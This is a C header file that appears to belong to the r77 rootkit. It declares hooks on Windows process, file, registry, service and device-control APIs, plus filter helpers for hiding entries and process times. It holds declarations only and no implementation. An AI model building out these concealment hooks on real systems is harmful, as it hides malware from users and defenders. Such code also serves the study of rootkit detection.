#include "r77mindef.h"
#include "ntdll.h"
#ifndef _HOOKS_H
#define _HOOKS_H

/// <summary>
/// Attaches hooks to r77 specific API's.
/// </summary>
VOID InitializeHooks();
/// <summary>
/// Detaches all hooks.
/// </summary>
VOID UninitializeHooks();

static VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction);
static VOID UninstallHook(LPVOID originalFunction, LPVOID hookedFunction);

static NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, LPVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);
static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount);
static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, ULONG queryFlags, PUNICODE_STRING fileName);
static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength);
static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength);
static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved);
static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName);
static BOOL WINAPI HookedEnumServicesStatusExW2(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName);
static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, ULONG ioControlCode, LPVOID inputBuffer, ULONG inputBufferLength, LPVOID outputBuffer, ULONG outputBufferLength);

static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime);
static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName);
static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name);
static ULONG FileInformationGetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass);
static VOID FileInformationSetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, ULONG value);
static PWCHAR KeyInformationGetName(LPVOID keyInformation, NT_KEY_INFORMATION_CLASS keyInformationClass);
static PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass);
static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned);
static VOID FilterEnumServiceStatusProcess(LPENUM_SERVICE_STATUS_PROCESSW services, LPDWORD servicesReturned);

#endif